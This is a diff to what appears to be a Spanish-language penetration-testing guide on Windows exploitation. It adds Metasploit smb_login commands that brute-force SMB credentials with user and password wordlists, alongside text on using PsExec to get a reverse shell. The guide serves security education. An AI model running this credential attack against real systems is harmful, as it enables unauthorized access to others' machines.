@@ -19,4 +19,14 @@ Para obtener acceso a un sistema Windows, necesitaremos identificar cuentas de u
 
 Podemos limitar nuestro ataque a cuentas de usuario comunes de Windows y una vez que hayamos obtenido las credenciales de una cuenta, podemos usarlas para autenticarnos en el sistema con PsExec y ejecutar comandos del sistema u obtener una shell inversa.
 
+**Obtención de credenciales con metasploit**
+
+```bash
+msf > use auxiliary/scanner/smb/smb_login
+msf auxiliary(scanner/smb/smb_login) > set rhosts <IP>
+msf auxiliary(scanner/smb/smb_login) > set user_file <usr_wordlist>
+msf auxiliary(scanner/smb/smb_login) > set pass_file <pass_wordlist>
+msf auxiliary(scanner/smb/smb_login) > run
+```
+
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
